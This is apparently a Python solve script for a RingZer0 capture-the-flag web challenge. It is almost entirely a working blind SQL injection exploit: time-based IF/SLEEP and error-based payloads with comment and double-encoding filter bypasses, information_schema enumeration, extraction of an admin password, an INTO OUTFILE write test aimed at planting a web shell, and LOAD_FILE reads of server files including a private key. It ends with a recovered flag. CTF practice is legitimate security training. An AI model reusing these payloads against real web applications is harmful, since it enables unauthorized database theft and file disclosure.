import requests
from time import time, sleep
import matplotlib.pyplot as plt
from concurrent.futures import ThreadPoolExecutor

TARGET = "http://challenges.ringzer0team.com:10158"

CHS = [i for i in range(0x20, 0x7f)]
CHS.remove(ord("'"))
CHS.remove(ord("\\"))

def req(u, p):

    res = requests.get(f"{TARGET}/?u={u}&p={p}")
    return res.status_code, res.content

def find_noop_chars():

    # are there other chars besides empty spaces removed from input?

    CHS_ = [i for i in range(0x20, 0x7f)]

    L = 3

    def cart_prod(idx):

        if idx == 0:
            yield ""
            return

        for c in CHS_:
            for ch_seq in cart_prod(idx - 1):
                yield ch_seq + f"%{hex(c)[2:]}"

    with ThreadPoolExecutor(max_workers = 4) as threadpool:

        res = \
        {
            l:
            {
                ch_seq: None
                for ch_seq in cart_prod(l)
            }
            for l in range(L)
        }

        for l in range(L):
            for ch_seq in cart_prod(l):
                res[l][ch_seq] = threadpool.submit(req, f"a{ch_seq}dmin", "")

        for l in range(L):
            print(f"l={l}")

            for ch_seq in cart_prod(l):
                
                res[l][ch_seq] = res[l][ch_seq].result()
                _, content = res[l][ch_seq]

                if b">Invalid username cannot find hot mom.<" in content:
                    continue

                elif b">Invalid password cannot find hot mom.<" in content:
                    print(f"invalid password for s={ch_seq}")

                else:
                    print(f"unknown response for s={ch_seq}")

# yet another time based sqli

def time_req(cond, sleep_on_false=True):

    cond = cond.replace(" ", "/**/")
    cond = cond.replace("'", "%2527")

    if sleep_on_false is True:
        r = f"%2527)/**/OR/**/2=IF(({cond}),1,SLEEP(3))%23"
    else:
        r = f"%2527)/**/OR/**/2=IF(({cond}),SLEEP(3),1)%23"

    t = time()
    req(r, "")
    t = time() - t

    return t

# alternative:
# use concatenation operator for altering admin username
# based of if condition

def error_req(cond):

    cond = cond.replace(" ", "/**/")
    cond = cond.replace("'", "%2527")

    r = f"admi%2527%252BIF(({cond}),%2527n%2527,1))%23"

    _, res = req(r, "")

    return b"Invalid password" in res

def max_from_time_queries(ts):

    l = None,
    t = -1

    for l_, t_ in ts.items():
        if t_ > t:
            l = l_ 
            t = t_

    return l

def trunc_common(s):

    idx_dif = len(s[0])

    for r in s.keys():

        if r == 0:
            continue
    
        idx_dif_ = 0
        while idx_dif_ < len(s[r]) and idx_dif_ < len(s[0]) and s[0][idx_dif_] == s[r][idx_dif_]:
            idx_dif_ += 1
        
        if idx_dif_ < idx_dif:
            idx_dif = idx_dif_

    return s[0][:idx_dif]

def str_to_hexrep(s):

    hr = 0

    i = 0
    while i < len(s):

        hr += ord(s[i])
        hr <<= 8

        i += 1

    hr >>= 8
    hr = hex(hr)

    return hr

def db_names():

    with ThreadPoolExecutor(max_workers = 8) as threadpool:

        db_cnt = ''

        for i in range(1):
        
            ts = {c_ord: None for c_ord in CHS}

            for c_ord in ts.keys():
                ts[c_ord] = threadpool.submit(time_req, f"STRCMP(ORD(SUBSTRING((SELECT COUNT(schema_name) FROM information_schema.schemata),{i + 1},1)),{c_ord})")
            
            for c_ord in ts.keys():
                ts[c_ord] = ts[c_ord].result()

            #plt.plot(ts.keys(), ts.values())
            #plt.show()

            db_cnt += f'{chr(max_from_time_queries(ts))}'

        db_cnt = int(db_cnt, 10)
        print(f"found {db_cnt} databases")

        MAX_LEN = 20

        ROUND_CNT = 3
        tables =    {
                        i: 
                        {
                            t_idx: None
                            for t_idx in range(db_cnt)
                        } 
                        for i in range(ROUND_CNT)
                    }

        for r in range(ROUND_CNT):
            for d_idx in range(db_cnt):

                name = []
                for i in range(MAX_LEN):

                    ts = {c_ord: None for c_ord in CHS}
                    for c_ord in ts.keys():
                        ts[c_ord] = threadpool.submit(time_req, f"STRCMP(ORD(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT {d_idx},1),{i + 1},1)),{c_ord})")

                    for c_ord in ts.keys():
                        ts[c_ord] = ts[c_ord].result()

                    name.append(chr(max_from_time_queries(ts)))

                tables[r][d_idx] = ''.join(name)

        for d_idx in range(db_cnt):
            
            idx_dif = len(tables[0][d_idx])

            for r in range(1, ROUND_CNT):
            
                idx_dif_ = 0
                while tables[0][d_idx][idx_dif_] == tables[r][d_idx][idx_dif_]:
                    idx_dif_ += 1
                
                if idx_dif_ < idx_dif:
                    idx_dif = idx_dif_

            tables[0][d_idx] = tables[0][d_idx][:idx_dif]
            print(f"found database {tables[0][d_idx]}")

        return [tables[0][d_idx] for d_idx in range(db_cnt)]
    
def db_name():

    with ThreadPoolExecutor(max_workers = 16) as threadpool:

        MAX_LEN = 20

        ROUND_CNT = 3
        dbname = {r: [] for r in range(ROUND_CNT)}
        for r in range(ROUND_CNT):

            for i in range(MAX_LEN):

                ts = {c_ord: None for c_ord in CHS}
                for c_ord in ts.keys():
                    ts[c_ord] = threadpool.submit(time_req, f"STRCMP(ORD(SUBSTRING(database(),{i + 1},1)),{c_ord})")

                for c_ord in ts.keys():
                    ts[c_ord] = ts[c_ord].result()

                #plt.plot(ts.keys(), ts.values())
                #plt.show()

                dbname[r].append(chr(max_from_time_queries(ts)))

        print(dbname)

        dbname = trunc_common(dbname)
        dbname = ''.join(dbname)

        print(f"database name {dbname}")
        return dbname

def table_names(dbname):

    dbname = str_to_hexrep(dbname)

    with ThreadPoolExecutor(max_workers = 8) as threadpool:

        table_cnt = ''

        for i in range(1):
        
            ts = {c_ord: None for c_ord in CHS}

            for c_ord in ts.keys():
                ts[c_ord] = threadpool.submit(time_req, f"STRCMP(ORD(SUBSTRING((SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema={dbname}),{i + 1},1)),{c_ord})")
            
            for c_ord in ts.keys():
                ts[c_ord] = ts[c_ord].result()

            plt.plot(ts.keys(), ts.values())
            plt.show()

            table_cnt += f'{chr(max_from_time_queries(ts))}'

        table_cnt = int(table_cnt, 10)
        print(f"database {dbname} has {table_cnt} tables")

        MAX_LEN = 20

        ROUND_CNT = 3
        tables =    {
                        i: 
                        {
                            t_idx: None
                            for t_idx in range(table_cnt)
                        } 
                        for i in range(ROUND_CNT)
                    }

        for r in range(ROUND_CNT):
            for t_idx in range(table_cnt):

                name = []
                for i in range(MAX_LEN):

                    ts = {c_ord: None for c_ord in CHS}
                    for c_ord in ts.keys():
                        ts[c_ord] = threadpool.submit(time_req, f"STRCMP(ORD(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema={dbname} LIMIT {t_idx},1),{i + 1},1)),{c_ord})")

                    for c_ord in ts.keys():
                        ts[c_ord] = ts[c_ord].result()

                    name.append(chr(max_from_time_queries(ts)))

                tables[r][t_idx] = ''.join(name)

        for t_idx in range(table_cnt):
            
            idx_dif = len(tables[0][t_idx])

            for r in range(1, ROUND_CNT):
            
                idx_dif_ = 0
                while tables[0][t_idx][idx_dif_] == tables[r][t_idx][idx_dif_]:
                    idx_dif_ += 1
                
                if idx_dif_ < idx_dif:
                    idx_dif = idx_dif_

            tables[0][t_idx] = tables[0][t_idx][:idx_dif]
            print(f"found table {tables[0][t_idx]}")

        return [tables[0][t_idx] for t_idx in range(table_cnt)]

def table_columns(dbname, flag_table):

    flag_table = str_to_hexrep(flag_table)
    dbname = str_to_hexrep(dbname)

    with ThreadPoolExecutor(max_workers = 8) as threadpool:

        column_cnt = ''

        for i in range(1):
        
            ts = {c_ord: None for c_ord in CHS}

            for c_ord in ts.keys():
                ts[c_ord] = threadpool.submit(time_req, f"STRCMP(ORD(SUBSTRING((SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name={flag_table} AND table_schema={dbname}),{i + 1},1)),{c_ord})")
            
            for c_ord in ts.keys():
                ts[c_ord] = ts[c_ord].result()

            column_cnt += f'{chr(max_from_time_queries(ts))}'

        column_cnt = int(column_cnt, 10)
        print(f"flag table {flag_table} has {column_cnt} columns")

        MAX_LEN = 20

        ROUND_CNT = 3
        columns =    {
                        i: 
                        {
                            t_idx: None
                            for t_idx in range(column_cnt)
                        } 
                        for i in range(ROUND_CNT)
                    }

        for r in range(ROUND_CNT):
            for t_idx in range(column_cnt):

                name = []
                for i in range(MAX_LEN):

                    ts = {c_ord: None for c_ord in CHS}
                    for c_ord in ts.keys():
                        ts[c_ord] = threadpool.submit(time_req, f"STRCMP(ORD(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name={flag_table} AND table_schema={dbname} LIMIT {t_idx},1),{i + 1},1)),{c_ord})")

                    for c_ord in ts.keys():
                        ts[c_ord] = ts[c_ord].result()

                    #plt.plot(ts.keys(), ts.values())
                    #plt.show()

                    name.append(chr(max_from_time_queries(ts)))

                columns[r][t_idx] = ''.join(name)

        for t_idx in range(column_cnt):
            
            idx_dif = len(columns[0][t_idx])

            for r in range(1, ROUND_CNT):
            
                idx_dif_ = 0
                while columns[0][t_idx][idx_dif_] == columns[r][t_idx][idx_dif_]:
                    idx_dif_ += 1
                
                if idx_dif_ < idx_dif:
                    idx_dif = idx_dif_

            columns[0][t_idx] = columns[0][t_idx][:idx_dif]
            print(f"found columns {columns[0][t_idx]}")

        return [columns[0][t_idx] for t_idx in range(column_cnt)]

def read_admin_pass(dbname, tablename):

    # previous check has shown only one entry is in admin db
    # read admin password

    # also, use error based sqli

    flag_table = f"{dbname}.{tablename}"

    with ThreadPoolExecutor(max_workers = 64) as threadpool:

        pass_len = ''

        MAX_LEN_DIGITS = 3
        for i in range(MAX_LEN_DIGITS):

            valid = False
        
            ans = {c_ord: None for c_ord in CHS}

            for c_ord in ans.keys():
                ans[c_ord] = threadpool.submit(error_req, f"STRCMP(ORD(SUBSTRING((SELECT LENGTH(password) FROM {flag_table}),{i + 1},1)),{c_ord})")
            
            for c_ord in ans.keys():
                if ans[c_ord].result() is False:

                    pass_len += f'{chr(c_ord)}'
                    valid = True
                    break

            if valid is False:
                break

        pass_len = int(pass_len, 10)
        print(f'password of length {pass_len}')

        password = ''
        for i in range(pass_len):

            ans = {c_ord: None for c_ord in CHS}

            for c_ord in ans.keys():
                ans[c_ord] = threadpool.submit(error_req, f"STRCMP(ORD(SUBSTRING((SELECT password FROM {flag_table}),{i + 1},1)),{c_ord})")

            for c_ord in ans.keys():
                if ans[c_ord].result() is False:

                    print(chr(c_ord), end="", flush=True)

                    password += f'{chr(c_ord)}'
                    valid = True
                    break

            if valid is False:
                print("ERROR")
                quit()

        print(f"password {password}")
        return password

def try_write_file():

    '''
        try to write and read a file to check whether a web shell is feasible to try or not
    '''

    sqli = "') UNION SELECT NULL,'youhavewritepermissions' into outfile '/tmp/testpermsqli323'#"
    sqli = sqli.replace("'", "%2527")
    sqli = sqli.replace(" ", "/**/")
    sqli = sqli.replace("#", "%23")

    req(sqli, "")

    sleep(1)

    print("can write and then read file?", time_req("LOAD_FILE('/tmp/testpermsqli323')") < 2)

def read_file(filepath):

    with ThreadPoolExecutor(max_workers = 64) as threadpool:

        page_len = ''

        MAX_LEN_DIGITS = 5
        for i in range(MAX_LEN_DIGITS):

            valid = False
        
            ans = {c_ord: None for c_ord in CHS}

            for c_ord in ans.keys():
                ans[c_ord] = threadpool.submit(error_req, f"STRCMP(ORD(SUBSTRING((SELECT LENGTH(LOAD_FILE('{filepath}'))),{i + 1},1)),{c_ord})")
            
            for c_ord in ans.keys():
                if ans[c_ord].result() is False:

                    page_len += f'{chr(c_ord)}'
                    valid = True
                    break

            if valid is False:
                break

        page_len = int(page_len, 10)
        print(f'page length {page_len}')

        page_contents = ''
        for i in range(page_len):

            ans = {c_ord: None for c_ord in CHS}

            for c_ord in ans.keys():
                ans[c_ord] = threadpool.submit(error_req, f"STRCMP(ORD(SUBSTRING((SELECT LOAD_FILE('{filepath}')),{i + 1},1)),{c_ord})")

            for c_ord in ans.keys():
                if ans[c_ord].result() is False:

                    print(chr(c_ord), end="", flush=True)

                    page_contents += f'{chr(c_ord)}'
                    valid = True
                    break

            if valid is False:
                print("ERROR")
                quit()

        print("done")

        with open("pass.txt", "w+") as f:
            f.write(page_contents)
        
        return page_contents

def start():

    #find_noop_chars()
    # invalid password / noop chars: %20 %2b %5c, all combinations of them if > 1 char EXCEPT %5c%5c

    #current_dbname = db_name()
    current_dbname = 'login'

    #tables = table_names(current_dbname)
    tables = ['users']

    #columns = table_columns(current_dbname, tables[0])
    columns = ["username", "password"]

    # ok search for other dbs
    #dbs = db_names()

    # try write/read a file
    #try_write_file()

    #password = read_admin_pass(current_dbname, tables[0])
    password = "aWzode4/Rbdd51trYTrWPFG/nq5yOPZg+A7Jh+OdMlKuCwJW7F+hByRisBsjTzeB67WGTyifOJwUEAo16FarJkYMDJh4TbG5wvIvg3ZWx89gbbVCnF7jN71KgPVtV+t5rcN9iLbz6QDy3UVsjnjq0uk57mMC2ANjNMl5QkCatfE="
    # login still does not work, so the password from the form is hashed?
    # sqli also does not work on password field, also suggesting hashing

    # try to read index page
    #read_file("/var/www/html/index.php")

    # try to read password file
    read_file("/askldjlkeasulawe/key.private")

    # decode the password (php script)
    # FLAG-wBGc5g147MuVQuC28L9Tw8H8HF

    return

if __name__ == "__main__":
    start()